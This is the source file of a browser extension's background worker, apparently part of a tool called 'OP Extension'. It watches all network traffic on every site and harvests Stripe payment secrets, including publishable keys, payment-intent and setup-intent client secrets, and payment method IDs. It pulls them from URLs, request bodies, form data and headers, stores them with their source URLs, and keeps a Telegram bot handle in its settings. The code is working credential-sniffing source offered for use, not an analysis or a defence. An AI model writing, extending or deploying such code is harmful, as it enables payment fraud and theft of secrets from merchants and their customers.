// OP Extension Background Service Worker
// Monitors network requests for Stripe keys

const TELEGRAM_BOT_ID = '@op_limitedbot';
const STORAGE_KEY = 'op_detected_keys';

// Patterns to match Stripe keys - MORE FLEXIBLE
const STRIPE_PATTERNS = {
  pk_live: /pk_live_[a-zA-Z0-9]{24,}/gi,
  client_key: /client_key[_=:\s]*([a-zA-Z0-9_\-]{10,})/gi,
  // Payment Intent client_secret - various formats
  client_secret: /pi_[a-zA-Z0-9\-_]{10,}_secret_[a-zA-Z0-9\-_]{10,}/gi,
  // Also match setup intents
  setup_secret: /seti_[a-zA-Z0-9\-_]{10,}_secret_[a-zA-Z0-9\-_]{10,}/gi,
  stripe_key: /(?:stripe|payment)_?(?:key|token)[_=:\s]*([a-zA-Z0-9_\-]{10,})/gi,
  // Payment Method IDs (pm_xxxxx)
  payment_method: /pm_[a-zA-Z0-9]{24,}/gi
};

// Initialize storage
chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ 
    [STORAGE_KEY]: [],
    telegramBot: TELEGRAM_BOT_ID,
    totalDetected: 0,
    enabled: true
  });
  console.log('[OP Extension] Installed and initialized');
});

// Listen for messages from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'STRIPE_KEYS_DETECTED') {
    handleDetectedKeys(message.data, sender);
    sendResponse({ status: 'received', count: message.data?.length || 0 });
  }
  return true;
});

// Monitor network requests - CHECK ALL URLS, not just stripe.com
// Note: webRequest listeners are observational only (no blocking)
if (chrome.webRequest) {
  chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      try {
        // Check ALL requests for keys, not just stripe domains
        analyzeRequest(details);
      } catch (e) {}
    },
    { urls: ['<all_urls>'] },
    ['requestBody']
  );

  // Monitor headers for Stripe keys - CHECK ALL REQUESTS
  chrome.webRequest.onSendHeaders.addListener(
    function(details) {
      try {
        var headers = details.requestHeaders || [];
        var url = details.url;
        
        headers.forEach(function(header) {
          checkForKeys(header.value, 'header', header.name, url);
        });
      } catch (e) {}
    },
    { urls: ['<all_urls>'] },
    ['requestHeaders']
  );
}

function analyzeRequest(details) {
  const url = details.url;
  
  // Check URL parameters (safely decode)
  try {
    checkForKeys(decodeURIComponent(url), 'url', null, url);
  } catch (e) {
    // Invalid URL encoding, use as-is
    checkForKeys(url, 'url', null, url);
  }
  
  // Check request body
  if (details.requestBody) {
    if (details.requestBody.raw) {
      details.requestBody.raw.forEach(part => {
        if (part.bytes) {
          try {
            const body = new TextDecoder().decode(part.bytes);
            checkForKeys(body, 'request_body', null, url);
          } catch (e) {}
        }
      });
    }
    if (details.requestBody.formData) {
      const formData = JSON.stringify(details.requestBody.formData);
      checkForKeys(formData, 'form_data', null, url);
    }
  }
}

function checkForKeys(text, source, subSource = null, url = '') {
  if (!text || typeof text !== 'string') return;
  
  // Limit text length to prevent performance issues (check first 100KB)
  var maxLength = 100000;
  if (text.length > maxLength) {
    text = text.substring(0, maxLength);
  }
  
  const detected = [];
  
  // Check for pk_live keys (use matchAll instead of exec loop for safety)
  try {
    var pkMatches = text.matchAll(STRIPE_PATTERNS.pk_live);
    for (var match of pkMatches) {
      detected.push({
        type: 'pk_live',
        value: match[0],
        source: source,
        subSource: subSource,
        url: url,
        timestamp: new Date().toISOString()
      });
    }
  } catch (e) {}
  
  // Check for client_key
  try {
    var clientMatches = text.matchAll(STRIPE_PATTERNS.client_key);
    for (var match of clientMatches) {
      detected.push({
        type: 'client_key',
        value: match[1] || match[0],
        source: source,
        subSource: subSource,
        url: url,
        timestamp: new Date().toISOString()
      });
    }
  } catch (e) {}
  
  // Check for client_secret (Payment Intent format)
  try {
    var secretMatches = text.matchAll(/pi_[a-zA-Z0-9\-_]{10,}_secret_[a-zA-Z0-9\-_]{10,}/gi);
    for (var match of secretMatches) {
      console.log('[OP] CLIENT_SECRET FOUND:', match[0]);
      detected.push({
        type: 'client_secret',
        value: match[0],
        source: source,
        subSource: subSource,
        url: url,
        timestamp: new Date().toISOString()
      });
    }
  } catch (e) {}
  
  // Check for setup intent secrets
  try {
    var setupMatches = text.matchAll(STRIPE_PATTERNS.setup_secret);
    for (var match of setupMatches) {
      console.log('[OP] SETUP_SECRET FOUND:', match[0]);
      detected.push({
        type: 'setup_secret',
        value: match[0],
        source: source,
        subSource: subSource,
        url: url,
        timestamp: new Date().toISOString()
      });
    }
  } catch (e) {}
  
  // Check for payment method IDs (pm_xxxxx)
  try {
    var pmMatches = text.matchAll(STRIPE_PATTERNS.payment_method);
    for (var match of pmMatches) {
      console.log('[OP] PAYMENT_METHOD FOUND:', match[0]);
      detected.push({
        type: 'payment_method',
        value: match[0],
        source: source,
        subSource: subSource,
        url: url,
        timestamp: new Date().toISOString()
      });
    }
  } catch (e) {}
  
  if (detected.length > 0) {
    console.log('[OP] Keys detected from', source + ':', detected);
    processDetectedKeys(detected);
  }
}

function handleDetectedKeys(keys, sender) {
  if (!keys || keys.length === 0) return;
  
  const detected = keys.map(key => ({
    ...key,
    source: key.source || 'page_content',
    timestamp: new Date().toISOString(),
    tabUrl: sender.tab?.url || 'unknown'
  }));
  
  processDetectedKeys(detected);
}

async function processDetectedKeys(keys) {
  try {
    const result = await chrome.storage.local.get([STORAGE_KEY, 'totalDetected']);
    const existing = result[STORAGE_KEY] || [];
    let total = result.totalDetected || 0;
    
    // Filter out duplicates
    const newKeys = keys.filter(key => {
      return !existing.some(e => 
        e.value === key.value && 
        e.type === key.type
      );
    });
    
    if (newKeys.length === 0) return;
    
    console.log('[OP] Adding new keys:', newKeys);
    
    // Add new keys to storage
    const updated = [...existing, ...newKeys];
    total += newKeys.length;
    
    await chrome.storage.local.set({
      [STORAGE_KEY]: updated,
      totalDetected: total,
      lastDetected: new Date().toISOString()
    });
    
    // Update badge
    chrome.action.setBadgeText({ text: total.toString() });
    chrome.action.setBadgeBackgroundColor({ color: '#00d084' });
    
    // Notify popup if open
    chrome.runtime.sendMessage({
      type: 'KEYS_UPDATED',
      count: newKeys.length,
      keys: newKeys
    }).catch(() => {});
    
  } catch (error) {
    console.error('[OP Extension] Error processing keys:', error);
  }
}

// Keep service worker alive
setInterval(() => {
  console.log('[OP Extension] Service worker heartbeat');
}, 25000);
